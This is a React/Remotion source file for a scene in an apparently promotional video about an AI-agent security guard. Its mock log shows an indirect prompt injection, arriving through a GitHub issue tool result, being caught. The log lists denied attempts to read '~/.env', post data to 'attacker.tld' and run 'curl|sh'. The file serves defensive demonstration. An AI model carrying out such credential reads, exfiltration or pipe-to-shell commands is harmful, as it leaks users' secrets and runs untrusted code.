import React from "react";
import { AbsoluteFill, useCurrentFrame, interpolate } from "remotion";
import { C, FONTS } from "../../design/tokens";
import { Mono, useEnter } from "../../design/Type";
import { NumberTicker } from "../../design/NumberTicker";

const LOG = [
  { c: C.signal, t: "guard.intercept tool.github.issues.get → payload received" },
  { c: C.signal, t: "guard.scan      indirect_injection · confidence 0.97" },
  { c: C.alert,  t: "guard.deny      tool.fs.read('~/.env') · 403" },
  { c: C.alert,  t: "guard.deny      tool.http.post(attacker.tld) · 403" },
  { c: C.alert,  t: "guard.deny      tool.shell.exec('curl|sh') · 403" },
  { c: C.signal, t: "guard.emit      audit.log · evt_a91f · signed" },
  { c: C.ok,     t: "guard.report    exfiltrated=0 saved=247KB decision=12ms" },
];

const Stat: React.FC<{ label: string; to: number; suffix?: string; color: string; delay: number; decimals?: number }> = ({ label, to, suffix, color, delay, decimals }) => (
  <div style={{
    background: C.panel, border: `1px solid ${C.rule}`, borderRadius: 12,
    padding: "20px 22px",
    ...useEnter(delay),
  }}>
    <Mono size={11} color={C.muted}>{label}</Mono>
    <div style={{ marginTop: 8 }}>
      <NumberTicker from={0} to={to} start={delay + 6} duration={50} suffix={suffix ?? ""} decimals={decimals ?? 0} size={52} color={color} weight={700} letterSpacing={-1.2} />
    </div>
  </div>
);

export const S8_Receipts: React.FC = () => {
  const f = useCurrentFrame();
  return (
    <AbsoluteFill style={{ fontFamily: FONTS.sans, color: C.paper, padding: "60px 120px" }}>
      <Mono size={14} color={C.muted}>act iii · scene 08</Mono>
      <div style={{ fontSize: 56, fontWeight: 600, letterSpacing: -1.2, marginTop: 10, ...useEnter(4) }}>
        Signed. Replayable. <span style={{ color: C.ok }}>Zero bytes leaked.</span>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1.45fr 1fr", gap: 48, marginTop: 38, alignItems: "start" }}>
        {/* terminal */}
        <div style={{
          background: "#06090F",
          border: `1px solid ${C.rule}`,
          borderRadius: 12,
          padding: "24px 26px",
          minHeight: 380,
          ...useEnter(8),
        }}>
          <div style={{ display: "flex", gap: 8, marginBottom: 14 }}>
            <span style={{ width: 12, height: 12, borderRadius: 999, background: "#ff5f57" }} />
            <span style={{ width: 12, height: 12, borderRadius: 999, background: "#febc2e" }} />
            <span style={{ width: 12, height: 12, borderRadius: 999, background: "#28c840" }} />
            <span style={{ marginLeft: 16, fontFamily: FONTS.mono, fontSize: 13, color: C.muted }}>
              anveguard · runtime.log
            </span>
          </div>
          {LOG.map((l, i) => {
            const start = 24 + i * 14;
            const op = interpolate(f, [start, start + 10], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
            const ty = interpolate(f, [start, start + 10], [6, 0], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
            return (
              <div key={i} style={{ opacity: op, transform: `translateY(${ty}px)`, fontFamily: FONTS.mono, fontSize: 16, lineHeight: 1.85, color: l.c }}>
                <span style={{ color: C.mutedSoft, marginRight: 14 }}>0{i + 1}</span>{l.t}
              </div>
            );
          })}
        </div>

        {/* stat tiles */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
          <Stat label="exfiltrated"    to={0}    suffix=" b"  color={C.ok}    delay={50} />
          <Stat label="would have leaked" to={247} suffix=" KB" color={C.alert} delay={70} />
          <Stat label="decision time"  to={12}   suffix=" ms" color={C.paper} delay={90} />
          <Stat label="replayable"     to={100}  suffix=" %"  color={C.signal} delay={110} />
        </div>
      </div>
    </AbsoluteFill>
  );
};
